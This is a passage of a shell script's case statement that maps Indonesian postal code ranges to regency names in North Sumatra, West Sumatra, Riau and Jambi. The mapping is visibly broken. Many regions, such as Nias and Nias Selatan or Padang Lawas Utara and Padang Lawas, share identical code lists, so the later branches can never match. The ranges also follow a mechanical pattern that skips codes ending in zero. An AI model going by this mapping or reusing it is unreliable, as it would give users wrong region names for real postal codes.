        24711|24712|24713|24714|24715|24716|24717|24718|24719|24721|24722|24723|24724|24725|24726|24727|24728|24729|24731|24732|24733|24734|24735|24736|24737|24738|24739|24741|24742|24743|24744|24745|24746|24747|24748|24749|24751|24752|24753|24754|24755|24756|24757|24758|24759|24761|24762|24763|24764|24765|24766|24767|24768|24769|24771|24772|24773|24774|24775|24776|24777|24778|24779|24781|24782|24783|24784|24785|24786|24787|24788|24789|24791|24792|24793|24794|24795|24796|24797|24798|24799)
            nama_daerah="Kota Subulussalam"
            found=1
            ;;
        22511|22512|22513|22514|22515|22516|22517|22518|22519|22521|22522|22523|22524|22525|22526|22527|22528|22529|22531|22532|22533|22534|22535|22536|22537|22538|22539|22541|22542|22543|22544|22545|22546|22547|22548|22549|22551|22552|22553|22554|22555|22556|22557|22558|22559|22561|22562|22563|22564|22565|22566|22567|22568|22569|22571|22572|22573|22574|22575|22576|22577|22578|22579|22581|22582|22583|22584|22585|22586|22587|22588|22589|22591|22592|22593|22594|22595|22596|22597|22598|22599)
            nama_daerah="Tapanuli Tengah"
            found=1
            ;;
        22411|22412|22413|22414|22415|22416|22417|22418|22419|22421|22422|22423|22424|22425|22426|22427|22428|22429|22431|22432|22433|22434|22435|22436|22437|22438|22439|22441|22442|22443|22444|22445|22446|22447|22448|22449|22451|22452|22453|22454|22455|22456|22457|22458|22459|22461|22462|22463|22464|22465|22466|22467|22468|22469|22471|22472|22473|22474|22475|22476|22477|22478|22479|22481|22482|22483|22484|22485|22486|22487|22488|22489|22491|22492|22493|22494|22495|22496|22497|22498|22499)
            nama_daerah="Tapanuli Utara"
            found=1
            ;;
        22711|22712|22713|22714|22715|22716|22717|22718|22719|22721|22722|22723|22724|22725|22726|22727|22728|22729|22731|22732|22733|22734|22735|22736|22737|22738|22739|22741|22742|22743|22744|22745|22746|22747|22748|22749|22751|22752|22753|22754|22755|22756|22757|22758|22759|22761|22762|22763|22764|22765|22766|22767|22768|22769|22771|22772|22773|22774|22775|22776|22777|22778|22779|22781|22782|22783|22784|22785|22786|22787|22788|22789|22791|22792|22793|22794|22795|22796|22797|22798|22799)
            nama_daerah="Tapanuli Selatan"
            found=1
            ;;
        22811|22812|22813|22814|22815|22816|22817|22818|22819|22821|22822|22823|22824|22825|22826|22827|22828|22829|22831|22832|22833|22834|22835|22836|22837|22838|22839|22841|22842|22843|22844|22845|22846|22847|22848|22849|22851|22852|22853|22854|22855|22856|22857|22858|22859|22861|22862|22863|22864|22865|22866|22867|22868|22869|22871|22872|22873|22874|22875|22876|22877|22878|22879|22881|22882|22883|22884|22885|22886|22887|22888|22889|22891|22892|22893|22894|22895|22896|22897|22898|22899)
            nama_daerah="Nias"
            found=1
            ;;
        20811|20812|20813|20814|20815|20816|20817|20818|20819|20821|20822|20823|20824|20825|20826|20827|20828|20829|20831|20832|20833|20834|20835|20836|20837|20838|20839|20841|20842|20843|20844|20845|20846|20847|20848|20849|20851|20852|20853|20854|20855|20856|20857|20858|20859|20861|20862|20863|20864|20865|20866|20867|20868|20869|20871|20872|20873|20874|20875|20876|20877|20878|20879|20881|20882|20883|20884|20885|20886|20887|20888|20889|20891|20892|20893|20894|20895|20896|20897|20898|20899)
            nama_daerah="Langkat"
            found=1
            ;;
        22111|22112|22113|22114|22115|22116|22117|22118|22119|22121|22122|22123|22124|22125|22126|22127|22128|22129|22131|22132|22133|22134|22135|22136|22137|22138|22139|22141|22142|22143|22144|22145|22146|22147|22148|22149|22151|22152|22153|22154|22155|22156|22157|22158|22159|22161|22162|22163|22164|22165|22166|22167|22168|22169|22171|22172|22173|22174|22175|22176|22177|22178|22179|22181|22182|22183|22184|22185|22186|22187|22188|22189|22191|22192|22193|22194|22195|22196|22197|22198|22199)
            nama_daerah="Karo"
            found=1
            ;;
        20511|20512|20513|20514|20515|20516|20517|20518|20519|20521|20522|20523|20524|20525|20526|20527|20528|20529|20531|20532|20533|20534|20535|20536|20537|20538|20539|20541|20542|20543|20544|20545|20546|20547|20548|20549|20551|20552|20553|20554|20555|20556|20557|20558|20559|20561|20562|20563|20564|20565|20566|20567|20568|20569|20571|20572|20573|20574|20575|20576|20577|20578|20579|20581|20582|20583|20584|20585|20586|20587|20588|20589|20591|20592|20593|20594|20595|20596|20597|20598|20599)
            nama_daerah="Deli Serdang"
            found=1
            ;;
        21111|21112|21113|21114|21115|21116|21117|21118|21119|21121|21122|21123|21124|21125|21126|21127|21128|21129|21131|21132|21133|21134|21135|21136|21137|21138|21139|21141|21142|21143|21144|21145|21146|21147|21148|21149|21151|21152|21153|21154|21155|21156|21157|21158|21159|21161|21162|21163|21164|21165|21166|21167|21168|21169|21171|21172|21173|21174|21175|21176|21177|21178|21179|21181|21182|21183|21184|21185|21186|21187|21188|21189|21191|21192|21193|21194|21195|21196|21197|21198|21199)
            nama_daerah="Simalungun"
            found=1
            ;;
        21211|21212|21213|21214|21215|21216|21217|21218|21219|21221|21222|21223|21224|21225|21226|21227|21228|21229|21231|21232|21233|21234|21235|21236|21237|21238|21239|21241|21242|21243|21244|21245|21246|21247|21248|21249|21251|21252|21253|21254|21255|21256|21257|21258|21259|21261|21262|21263|21264|21265|21266|21267|21268|21269|21271|21272|21273|21274|21275|21276|21277|21278|21279|21281|21282|21283|21284|21285|21286|21287|21288|21289|21291|21292|21293|21294|21295|21296|21297|21298|21299)
            nama_daerah="Asahan"
            found=1
            ;;
        21411|21412|21413|21414|21415|21416|21417|21418|21419|21421|21422|21423|21424|21425|21426|21427|21428|21429|21431|21432|21433|21434|21435|21436|21437|21438|21439|21441|21442|21443|21444|21445|21446|21447|21448|21449|21451|21452|21453|21454|21455|21456|21457|21458|21459|21461|21462|21463|21464|21465|21466|21467|21468|21469|21471|21472|21473|21474|21475|21476|21477|21478|21479|21481|21482|21483|21484|21485|21486|21487|21488|21489|21491|21492|21493|21494|21495|21496|21497|21498|21499)
            nama_daerah="Labuhanbatu"
            found=1
            ;;
        22211|22212|22213|22214|22215|22216|22217|22218|22219|22221|22222|22223|22224|22225|22226|22227|22228|22229|22231|22232|22233|22234|22235|22236|22237|22238|22239|22241|22242|22243|22244|22245|22246|22247|22248|22249|22251|22252|22253|22254|22255|22256|22257|22258|22259|22261|22262|22263|22264|22265|22266|22267|22268|22269|22271|22272|22273|22274|22275|22276|22277|22278|22279|22281|22282|22283|22284|22285|22286|22287|22288|22289|22291|22292|22293|22294|22295|22296|22297|22298|22299)
            nama_daerah="Dairi"
            found=1
            ;;
        22311|22312|22313|22314|22315|22316|22317|22318|22319|22321|22322|22323|22324|22325|22326|22327|22328|22329|22331|22332|22333|22334|22335|22336|22337|22338|22339|22341|22342|22343|22344|22345|22346|22347|22348|22349|22351|22352|22353|22354|22355|22356|22357|22358|22359|22361|22362|22363|22364|22365|22366|22367|22368|22369|22371|22372|22373|22374|22375|22376|22377|22378|22379|22381|22382|22383|22384|22385|22386|22387|22388|22389|22391|22392|22393|22394|22395|22396|22397|22398|22399)
            nama_daerah="Toba Samosir"
            found=1
             ;;
                22911|22912|22913|22914|22915|22916|22917|22918|22919|22921|22922|22923|22924|22925|22926|22927|22928|22929|22931|22932|22933|22934|22935|22936|22937|22938|22939|22941|22942|22943|22944|22945|22946|22947|22948|22949|22951|22952|22953|22954|22955|22956|22957|22958|22959|22961|22962|22963|22964|22965|22966|22967|22968|22969|22971|22972|22973|22974|22975|22976|22977|22978|22979|22981|22982|22983|22984|22985|22986|22987|22988|22989|22991|22992|22993|22994|22995|22996|22997|22998|22999)
            nama_daerah="Mandailing Natal"
            found=1
            ;;
        22811|22812|22813|22814|22815|22816|22817|22818|22819|22821|22822|22823|22824|22825|22826|22827|22828|22829|22831|22832|22833|22834|22835|22836|22837|22838|22839|22841|22842|22843|22844|22845|22846|22847|22848|22849|22851|22852|22853|22854|22855|22856|22857|22858|22859|22861|22862|22863|22864|22865|22866|22867|22868|22869|22871|22872|22873|22874|22875|22876|22877|22878|22879|22881|22882|22883|22884|22885|22886|22887|22888|22889|22891|22892|22893|22894|22895|22896|22897|22898|22899)
            nama_daerah="Nias Selatan"
            found=1
            ;;
        22211|22212|22213|22214|22215|22216|22217|22218|22219|22221|22222|22223|22224|22225|22226|22227|22228|22229|22231|22232|22233|22234|22235|22236|22237|22238|22239|22241|22242|22243|22244|22245|22246|22247|22248|22249|22251|22252|22253|22254|22255|22256|22257|22258|22259|22261|22262|22263|22264|22265|22266|22267|22268|22269|22271|22272|22273|22274|22275|22276|22277|22278|22279|22281|22282|22283|22284|22285|22286|22287|22288|22289|22291|22292|22293|22294|22295|22296|22297|22298|22299)
            nama_daerah="Pakpak Bharat"
            found=1
            ;;
        22411|22412|22413|22414|22415|22416|22417|22418|22419|22421|22422|22423|22424|22425|22426|22427|22428|22429|22431|22432|22433|22434|22435|22436|22437|22438|22439|22441|22442|22443|22444|22445|22446|22447|22448|22449|22451|22452|22453|22454|22455|22456|22457|22458|22459|22461|22462|22463|22464|22465|22466|22467|22468|22469|22471|22472|22473|22474|22475|22476|22477|22478|22479|22481|22482|22483|22484|22485|22486|22487|22488|22489|22491|22492|22493|22494|22495|22496|22497|22498|22499)
            nama_daerah="Humbang Hasundutan"
            found=1
            ;;
        22311|22312|22313|22314|22315|22316|22317|22318|22319|22321|22322|22323|22324|22325|22326|22327|22328|22329|22331|22332|22333|22334|22335|22336|22337|22338|22339|22341|22342|22343|22344|22345|22346|22347|22348|22349|22351|22352|22353|22354|22355|22356|22357|22358|22359|22361|22362|22363|22364|22365|22366|22367|22368|22369|22371|22372|22373|22374|22375|22376|22377|22378|22379|22381|22382|22383|22384|22385|22386|22387|22388|22389|22391|22392|22393|22394|22395|22396|22397|22398|22399)
            nama_daerah="Samosir"
            found=1
            ;;
        20911|20912|20913|20914|20915|20916|20917|20918|20919|20921|20922|20923|20924|20925|20926|20927|20928|20929|20931|20932|20933|20934|20935|20936|20937|20938|20939|20941|20942|20943|20944|20945|20946|20947|20948|20949|20951|20952|20953|20954|20955|20956|20957|20958|20959|20961|20962|20963|20964|20965|20966|20967|20968|20969|20971|20972|20973|20974|20975|20976|20977|20978|20979|20981|20982|20983|20984|20985|20986|20987|20988|20989|20991|20992|20993|20994|20995|20996|20997|20998|20999)
            nama_daerah="Serdang Bedagai"
            found=1
            ;;
        21211|21212|21213|21214|21215|21216|21217|21218|21219|21221|21222|21223|21224|21225|21226|21227|21228|21229|21231|21232|21233|21234|21235|21236|21237|21238|21239|21241|21242|21243|21244|21245|21246|21247|21248|21249|21251|21252|21253|21254|21255|21256|21257|21258|21259|21261|21262|21263|21264|21265|21266|21267|21268|21269|21271|21272|21273|21274|21275|21276|21277|21278|21279|21281|21282|21283|21284|21285|21286|21287|21288|21289|21291|21292|21293|21294|21295|21296|21297|21298|21299)
            nama_daerah="Batu Bara"
            found=1
            ;;
         22711|22712|22713|22714|22715|22716|22717|22718|22719|22721|22722|22723|22724|22725|22726|22727|22728|22729|22731|22732|22733|22734|22735|22736|22737|22738|22739|22741|22742|22743|22744|22745|22746|22747|22748|22749|22751|22752|22753|22754|22755|22756|22757|22758|22759|22761|22762|22763|22764|22765|22766|22767|22768|22769|22771|22772|22773|22774|22775|22776|22777|22778|22779|22781|22782|22783|22784|22785|22786|22787|22788|22789|22791|22792|22793|22794|22795|22796|22797|22798|22799)
            nama_daerah="Padang Lawas Utara"
            found=1
            ;;
        22711|22712|22713|22714|22715|22716|22717|22718|22719|22721|22722|22723|22724|22725|22726|22727|22728|22729|22731|22732|22733|22734|22735|22736|22737|22738|22739|22741|22742|22743|22744|22745|22746|22747|22748|22749|22751|22752|22753|22754|22755|22756|22757|22758|22759|22761|22762|22763|22764|22765|22766|22767|22768|22769|22771|22772|22773|22774|22775|22776|22777|22778|22779|22781|22782|22783|22784|22785|22786|22787|22788|22789|22791|22792|22793|22794|22795|22796|22797|22798|22799)
            nama_daerah="Padang Lawas"
            found=1
            ;;
        21411|21412|21413|21414|21415|21416|21417|21418|21419|21421|21422|21423|21424|21425|21426|21427|21428|21429|21431|21432|21433|21434|21435|21436|21437|21438|21439|21441|21442|21443|21444|21445|21446|21447|21448|21449|21451|21452|21453|21454|21455|21456|21457|21458|21459|21461|21462|21463|21464|21465|21466|21467|21468|21469|21471|21472|21473|21474|21475|21476|21477|21478|21479|21481|21482|21483|21484|21485|21486|21487|21488|21489|21491|21492|21493|21494|21495|21496|21497|21498|21499)
            nama_daerah="Labuhanbatu Selatan"
            found=1
            ;;
        21411|21412|21413|21414|21415|21416|21417|21418|21419|21421|21422|21423|21424|21425|21426|21427|21428|21429|21431|21432|21433|21434|21435|21436|21437|21438|21439|21441|21442|21443|21444|21445|21446|21447|21448|21449|21451|21452|21453|21454|21455|21456|21457|21458|21459|21461|21462|21463|21464|21465|21466|21467|21468|21469|21471|21472|21473|21474|21475|21476|21477|21478|21479|21481|21482|21483|21484|21485|21486|21487|21488|21489|21491|21492|21493|21494|21495|21496|21497|21498|21499)
            nama_daerah="Labuhanbatu Utara"
            found=1
            ;;
        22811|22812|22813|22814|22815|22816|22817|22818|22819|22821|22822|22823|22824|22825|22826|22827|22828|22829|22831|22832|22833|22834|22835|22836|22837|22838|22839|22841|22842|22843|22844|22845|22846|22847|22848|22849|22851|22852|22853|22854|22855|22856|22857|22858|22859|22861|22862|22863|22864|22865|22866|22867|22868|22869|22871|22872|22873|22874|22875|22876|22877|22878|22879|22881|22882|22883|22884|22885|22886|22887|22888|22889|22891|22892|22893|22894|22895|22896|22897|22898|22899)
            nama_daerah="Nias Utara"
            found=1
            ;;
        22811|22812|22813|22814|22815|22816|22817|22818|22819|22821|22822|22823|22824|22825|22826|22827|22828|22829|22831|22832|22833|22834|22835|22836|22837|22838|22839|22841|22842|22843|22844|22845|22846|22847|22848|22849|22851|22852|22853|22854|22855|22856|22857|22858|22859|22861|22862|22863|22864|22865|22866|22867|22868|22869|22871|22872|22873|22874|22875|22876|22877|22878|22879|22881|22882|22883|22884|22885|22886|22887|22888|22889|22891|22892|22893|22894|22895|22896|22897|22898|22899)
            nama_daerah="Nias Barat"
            found=1
            ;;
        25511|25512|25513|25514|25515|25516|25517|25518|25519|25521|25522|25523|25524|25525|25526|25527|25528|25529|25531|25532|25533|25534|25535|25536|25537|25538|25539|25541|25542|25543|25544|25545|25546|25547|25548|25549|25551|25552|25553|25554|25555|25556|25557|25558|25559|25561|25562|25563|25564|25565|25566|25567|25568|25569|25571|25572|25573|25574|25575|25576|25577|25578|25579|25581|25582|25583|25584|25585|25586|25587|25588|25589|25591|25592|25593|25594|25595|25596|25597|25598|25599)
            nama_daerah="Pesisir Selatan"
            found=1
            ;;
        27311|27312|27313|27314|27315|27316|27317|27318|27319|27321|27322|27323|27324|27325|27326|27327|27328|27329|27331|27332|27333|27334|27335|27336|27337|27338|27339|27341|27342|27343|27344|27345|27346|27347|27348|27349|27351|27352|27353|27354|27355|27356|27357|27358|27359|27361|27362|27363|27364|27365|27366|27367|27368|27369|27371|27372|27373|27374|27375|27376|27377|27378|27379|27381|27382|27383|27384|27385|27386|27387|27388|27389|27391|27392|27393|27394|27395|27396|27397|27398|27399)
            nama_daerah="Solok"
            found=1
            ;;
        27511|27512|27513|27514|27515|27516|27517|27518|27519|27521|27522|27523|27524|27525|27526|27527|27528|27529|27531|27532|27533|27534|27535|27536|27537|27538|27539|27541|27542|27543|27544|27545|27546|27547|27548|27549|27551|27552|27553|27554|27555|27556|27557|27558|27559|27561|27562|27563|27564|27565|27566|27567|27568|27569|27571|27572|27573|27574|27575|27576|27577|27578|27579|27581|27582|27583|27584|27585|27586|27587|27588|27589|27591|27592|27593|27594|27595|27596|27597|27598|27599)
            nama_daerah="Sijunjung"
            found=1
            ;;
        27211|27212|27213|27214|27215|27216|27217|27218|27219|27221|27222|27223|27224|27225|27226|27227|27228|27229|27231|27232|27233|27234|27235|27236|27237|27238|27239|27241|27242|27243|27244|27245|27246|27247|27248|27249|27251|27252|27253|27254|27255|27256|27257|27258|27259|27261|27262|27263|27264|27265|27266|27267|27268|27269|27271|27272|27273|27274|27275|27276|27277|27278|27279|27281|27282|27283|27284|27285|27286|27287|27288|27289|27291|27292|27293|27294|27295|27296|27297|27298|27299)
            nama_daerah="Tanah Datar"
            found=1
            ;;
        25511|25512|25513|25514|25515|25516|25517|25518|25519|25521|25522|25523|25524|25525|25526|25527|25528|25529|25531|25532|25533|25534|25535|25536|25537|25538|25539|25541|25542|25543|25544|25545|25546|25547|25548|25549|25551|25552|25553|25554|25555|25556|25557|25558|25559|25561|25562|25563|25564|25565|25566|25567|25568|25569|25571|25572|25573|25574|25575|25576|25577|25578|25579|25581|25582|25583|25584|25585|25586|25587|25588|25589|25591|25592|25593|25594|25595|25596|25597|25598|25599)
            nama_daerah="Padang Pariaman"
            found=1
            ;;
        26411|26412|26413|26414|26415|26416|26417|26418|26419|26421|26422|26423|26424|26425|26426|26427|26428|26429|26431|26432|26433|26434|26435|26436|26437|26438|26439|26441|26442|26443|26444|26445|26446|26447|26448|26449|26451|26452|26453|26454|26455|26456|26457|26458|26459|26461|26462|26463|26464|26465|26466|26467|26468|26469|26471|26472|26473|26474|26475|26476|26477|26478|26479|26481|26482|26483|26484|26485|26486|26487|26488|26489|26491|26492|26493|26494|26495|26496|26497|26498|26499)
            nama_daerah="Agam"
            found=1
            ;;
        26211|26212|26213|26214|26215|26216|26217|26218|26219|26221|26222|26223|26224|26225|26226|26227|26228|26229|26231|26232|26233|26234|26235|26236|26237|26238|26239|26241|26242|26243|26244|26245|26246|26247|26248|26249|26251|26252|26253|26254|26255|26256|26257|26258|26259|26261|26262|26263|26264|26265|26266|26267|26268|26269|26271|26272|26273|26274|26275|26276|26277|26278|26279|26281|26282|26283|26284|26285|26286|26287|26288|26289|26291|26292|26293|26294|26295|26296|26297|26298|26299)
            nama_daerah="Lima Puluh Kota"
            found=1
            ;;
            26311|26312|26313|26314|26315|26316|26317|26318|26319|26321|26322|26323|26324|26325|26326|26327|26328|26329|26331|26332|26333|26334|26335|26336|26337|26338|26339|26341|26342|26343|26344|26345|26346|26347|26348|26349|26351|26352|26353|26354|26355|26356|26357|26358|26359|26361|26362|26363|26364|26365|26366|26367|26368|26369|26371|26372|26373|26374|26375|26376|26377|26378|26379|26381|26382|26383|26384|26385|26386|26387|26388|26389|26391|26392|26393|26394|26395|26396|26397|26398|26399)
            nama_daerah="Pasaman"
            found=1
            ;;
        25311|25312|25313|25314|25315|25316|25317|25318|25319|25321|25322|25323|25324|25325|25326|25327|25328|25329|25331|25332|25333|25334|25335|25336|25337|25338|25339|25341|25342|25343|25344|25345|25346|25347|25348|25349|25351|25352|25353|25354|25355|25356|25357|25358|25359|25361|25362|25363|25364|25365|25366|25367|25368|25369|25371|25372|25373|25374|25375|25376|25377|25378|25379|25381|25382|25383|25384|25385|25386|25387|25388|25389|25391|25392|25393|25394|25395|25396|25397|25398|25399)
            nama_daerah="Kepulauan Mentawai"
            found=1
            ;;
        27611|27612|27613|27614|27615|27616|27617|27618|27619|27621|27622|27623|27624|27625|27626|27627|27628|27629|27631|27632|27633|27634|27635|27636|27637|27638|27639|27641|27642|27643|27644|27645|27646|27647|27648|27649|27651|27652|27653|27654|27655|27656|27657|27658|27659|27661|27662|27663|27664|27665|27666|27667|27668|27669|27671|27672|27673|27674|27675|27676|27677|27678|27679|27681|27682|27683|27684|27685|27686|27687|27688|27689|27691|27692|27693|27694|27695|27696|27697|27698|27699)
            nama_daerah="Dharmasraya"
            found=1
            ;;
        27711|27712|27713|27714|27715|27716|27717|27718|27719|27721|27722|27723|27724|27725|27726|27727|27728|27729|27731|27732|27733|27734|27735|27736|27737|27738|27739|27741|27742|27743|27744|27745|27746|27747|27748|27749|27751|27752|27753|27754|27755|27756|27757|27758|27759|27761|27762|27763|27764|27765|27766|27767|27768|27769|27771|27772|27773|27774|27775|27776|27777|27778|27779|27781|27782|27783|27784|27785|27786|27787|27788|27789|27791|27792|27793|27794|27795|27796|27797|27798|27799)
            nama_daerah="Solok Selatan"
            found=1
            ;;
        26311|26312|26313|26314|26315|26316|26317|26318|26319|26321|26322|26323|26324|26325|26326|26327|26328|26329|26331|26332|26333|26334|26335|26336|26337|26338|26339|26341|26342|26343|26344|26345|26346|26347|26348|26349|26351|26352|26353|26354|26355|26356|26357|26358|26359|26361|26362|26363|26364|26365|26366|26367|26368|26369|26371|26372|26373|26374|26375|26376|26377|26378|26379|26381|26382|26383|26384|26385|26386|26387|26388|26389|26391|26392|26393|26394|26395|26396|26397|26398|26399)
            nama_daerah="Pasaman Barat"
            found=1
            ;;
        28411|28412|28413|28414|28415|28416|28417|28418|28419|28421|28422|28423|28424|28425|28426|28427|28428|28429|28431|28432|28433|28434|28435|28436|28437|28438|28439|28441|28442|28443|28444|28445|28446|28447|28448|28449|28451|28452|28453|28454|28455|28456|28457|28458|28459|28461|28462|28463|28464|28465|28466|28467|28468|28469|28471|28472|28473|28474|28475|28476|28477|28478|28479|28481|28482|28483|28484|28485|28486|28487|28488|28489|28491|28492|28493|28494|28495|28496|28497|28498|28499)
            nama_daerah="Kampar"
            found=1
            ;;
        29311|29312|29313|29314|29315|29316|29317|29318|29319|29321|29322|29323|29324|29325|29326|29327|29328|29329|29331|29332|29333|29334|29335|29336|29337|29338|29339|29341|29342|29343|29344|29345|29346|29347|29348|29349|29351|29352|29353|29354|29355|29356|29357|29358|29359|29361|29362|29363|29364|29365|29366|29367|29368|29369|29371|29372|29373|29374|29375|29376|29377|29378|29379|29381|29382|29383|29384|29385|29386|29387|29388|29389|29391|29392|29393|29394|29395|29396|29397|29398|29399)
            nama_daerah="Indragiri Hulu"
            found=1
            ;;
        28711|28712|28713|28714|28715|28716|28717|28718|28719|28721|28722|28723|28724|28725|28726|28727|28728|28729|28731|28732|28733|28734|28735|28736|28737|28738|28739|28741|28742|28743|28744|28745|28746|28747|28748|28749|28751|28752|28753|28754|28755|28756|28757|28758|28759|28761|28762|28763|28764|28765|28766|28767|28768|28769|28771|28772|28773|28774|28775|28776|28777|28778|28779|28781|28782|28783|28784|28785|28786|28787|28788|28789|28791|28792|28793|28794|28795|28796|28797|28798|28799)
            nama_daerah="Bengkalis"
            found=1
            ;;
        29211|29212|29213|29214|29215|29216|29217|29218|29219|29221|29222|29223|29224|29225|29226|29227|29228|29229|29231|29232|29233|29234|29235|29236|29237|29238|29239|29241|29242|29243|29244|29245|29246|29247|29248|29249|29251|29252|29253|29254|29255|29256|29257|29258|29259|29261|29262|29263|29264|29265|29266|29267|29268|29269|29271|29272|29273|29274|29275|29276|29277|29278|29279|29281|29282|29283|29284|29285|29286|29287|29288|29289|29291|29292|29293|29294|29295|29296|29297|29298|29299)
            nama_daerah="Indragiri Hilir"
            found=1
            ;;
        28311|28312|28313|28314|28315|28316|28317|28318|28319|28321|28322|28323|28324|28325|28326|28327|28328|28329|28331|28332|28333|28334|28335|28336|28337|28338|28339|28341|28342|28343|28344|28345|28346|28347|28348|28349|28351|28352|28353|28354|28355|28356|28357|28358|28359|28361|28362|28363|28364|28365|28366|28367|28368|28369|28371|28372|28373|28374|28375|28376|28377|28378|28379|28381|28382|28383|28384|28385|28386|28387|28388|28389|28391|28392|28393|28394|28395|28396|28397|28398|28399)
            nama_daerah="Pelalawan"
            found=1
            ;;
        28511|28512|28513|28514|28515|28516|28517|28518|28519|28521|28522|28523|28524|28525|28526|28527|28528|28529|28531|28532|28533|28534|28535|28536|28537|28538|28539|28541|28542|28543|28544|28545|28546|28547|28548|28549|28551|28552|28553|28554|28555|28556|28557|28558|28559|28561|28562|28563|28564|28565|28566|28567|28568|28569|28571|28572|28573|28574|28575|28576|28577|28578|28579|28581|28582|28583|28584|28585|28586|28587|28588|28589|28591|28592|28593|28594|28595|28596|28597|28598|28599)
            nama_daerah="Rokan Hulu"
            found=1
            ;;
        28911|28912|28913|28914|28915|28916|28917|28918|28919|28921|28922|28923|28924|28925|28926|28927|28928|28929|28931|28932|28933|28934|28935|28936|28937|28938|28939|28941|28942|28943|28944|28945|28946|28947|28948|28949|28951|28952|28953|28954|28955|28956|28957|28958|28959|28961|28962|28963|28964|28965|28966|28967|28968|28969|28971|28972|28973|28974|28975|28976|28977|28978|28979|28981|28982|28983|28984|28985|28986|28987|28988|28989|28991|28992|28993|28994|28995|28996|28997|28998|28999)
            nama_daerah="Rokan Hilir"
            found=1
            ;;
        28611|28612|28613|28614|28615|28616|28617|28618|28619|28621|28622|28623|28624|28625|28626|28627|28628|28629|28631|28632|28633|28634|28635|28636|28637|28638|28639|28641|28642|28643|28644|28645|28646|28647|28648|28649|28651|28652|28653|28654|28655|28656|28657|28658|28659|28661|28662|28663|28664|28665|28666|28667|28668|28669|28671|28672|28673|28674|28675|28676|28677|28678|28679|28681|28682|28683|28684|28685|28686|28687|28688|28689|28691|28692|28693|28694|28695|28696|28697|28698|28699)
            nama_daerah="Siak"
            found=1
            ;;
        29511|29512|29513|29514|29515|29516|29517|29518|29519|29521|29522|29523|29524|29525|29526|29527|29528|29529|29531|29532|29533|29534|29535|29536|29537|29538|29539|29541|29542|29543|29544|29545|29546|29547|29548|29549|29551|29552|29553|29554|29555|29556|29557|29558|29559|29561|29562|29563|29564|29565|29566|29567|29568|29569|29571|29572|29573|29574|29575|29576|29577|29578|29579|29581|29582|29583|29584|29585|29586|29587|29588|29589|29591|29592|29593|29594|29595|29596|29597|29598|29599)
            nama_daerah="Kuantan Singingi"
            found=1
            ;;
        28711|28712|28713|28714|28715|28716|28717|28718|28719|28721|28722|28723|28724|28725|28726|28727|28728|28729|28731|28732|28733|28734|28735|28736|28737|28738|28739|28741|28742|28743|28744|28745|28746|28747|28748|28749|28751|28752|28753|28754|28755|28756|28757|28758|28759|28761|28762|28763|28764|28765|28766|28767|28768|28769|28771|28772|28773|28774|28775|28776|28777|28778|28779|28781|28782|28783|28784|28785|28786|28787|28788|28789|28791|28792|28793|28794|28795|28796|28797|28798|28799)
            nama_daerah="Kepulauan Meranti"
            found=1
            ;;
        37111|37112|37113|37114|37115|37116|37117|37118|37119|37121|37122|37123|37124|37125|37126|37127|37128|37129|37131|37132|37133|37134|37135|37136|37137|37138|37139|37141|37142|37143|37144|37145|37146|37147|37148|37149|37151|37152|37153|37154|37155|37156|37157|37158|37159|37161|37162|37163|37164|37165|37166|37167|37168|37169|37171|37172|37173|37174|37175|37176|37177|37178|37179|37181|37182|37183|37184|37185|37186|37187|37188|37189|37191|37192|37193|37194|37195|37196|37197|37198|37199)
            nama_daerah="Kerinci"
            found=1
            ;;
        37311|37312|37313|37314|37315|37316|37317|37318|37319|37321|37322|37323|37324|37325|37326|37327|37328|37329|37331|37332|37333|37334|37335|37336|37337|37338|37339|37341|37342|37343|37344|37345|37346|37347|37348|37349|37351|37352|37353|37354|37355|37356|37357|37358|37359|37361|37362|37363|37364|37365|37366|37367|37368|37369|37371|37372|37373|37374|37375|37376|37377|37378|37379|37381|37382|37383|37384|37385|37386|37387|37388|37389|37391|37392|37393|37394|37395|37396|37397|37398|37399)
            nama_daerah="Merangin"
            found=1
            ;;
       37411|37412|37413|37414|37415|37416|37417|37418|37419|37421|37422|37423|37424|37425|37426|37427|37428|37429|37431|37432|37433|37434|37435|37436|37437|37438|37439|37441|37442|37443|37444|37445|37446|37447|37448|37449|37451|37452|37453|37454|37455|37456|37457|37458|37459|37461|37462|37463|37464|37465|37466|37467|37468|37469|37471|37472|37473|37474|37475|37476|37477|37478|37479|37481|37482|37483|37484|37485|37486|37487|37488|37489|37491|37492|37493|37494|37495|37496|37497|37498|37499)
            nama_daerah="Sarolangun"
            found=1
            ;;
        36611|36612|36613|36614|36615|36616|36617|36618|36619|36621|36622|36623|36624|36625|36626|36627|36628|36629|36631|36632|36633|36634|36635|36636|36637|36638|36639|36641|36642|36643|36644|36645|36646|36647|36648|36649|36651|36652|36653|36654|36655|36656|36657|36658|36659|36661|36662|36663|36664|36665|36666|36667|36668|36669|36671|36672|36673|36674|36675|36676|36677|36678|36679|36681|36682|36683|36684|36685|36686|36687|36688|36689|36691|36692|36693|36694|36695|36696|36697|36698|36699)
            nama_daerah="Batanghari"
            found=1
            ;;
        36311|36312|36313|36314|36315|36316|36317|36318|36319|36321|36322|36323|36324|36325|36326|36327|36328|36329|36331|36332|36333|36334|36335|36336|36337|36338|36339|36341|36342|36343|36344|36345|36346|36347|36348|36349|36351|36352|36353|36354|36355|36356|36357|36358|36359|36361|36362|36363|36364|36365|36366|36367|36368|36369|36371|36372|36373|36374|36375|36376|36377|36378|36379|36381|36382|36383|36384|36385|36386|36387|36388|36389|36391|36392|36393|36394|36395|36396|36397|36398|36399)
            nama_daerah="Muaro Jambi"
            found=1
            ;;
        36511|36512|36513|36514|36515|36516|36517|36518|36519|36521|36522|36523|36524|36525|36526|36527|36528|36529|36531|36532|36533|36534|36535|36536|36537|36538|36539|36541|36542|36543|36544|36545|36546|36547|36548|36549|36551|36552|36553|36554|36555|36556|36557|36558|36559|36561|36562|36563|36564|36565|36566|36567|36568|36569|36571|36572|36573|36574|36575|36576|36577|36578|36579|36581|36582|36583|36584|36585|36586|36587|36588|36589|36591|36592|36593|36594|36595|36596|36597|36598|36599)
            nama_daerah="Tanjung Jabung Barat"
            found=1
            ;;
        36711|36712|36713|36714|36715|36716|36717|36718|36719|36721|36722|36723|36724|36725|36726|36727|36728|36729|36731|36732|36733|36734|36735|36736|36737|36738|36739|36741|36742|36743|36744|36745|36746|36747|36748|36749|36751|36752|36753|36754|36755|36756|36757|36758|36759|36761|36762|36763|36764|36765|36766|36767|36768|36769|36771|36772|36773|36774|36775|36776|36777|36778|36779|36781|36782|36783|36784|36785|36786|36787|36788|36789|36791|36792|36793|36794|36795|36796|36797|36798|36799)
            nama_daerah="Tanjung Jabung Timur"
            found=1
            ;;
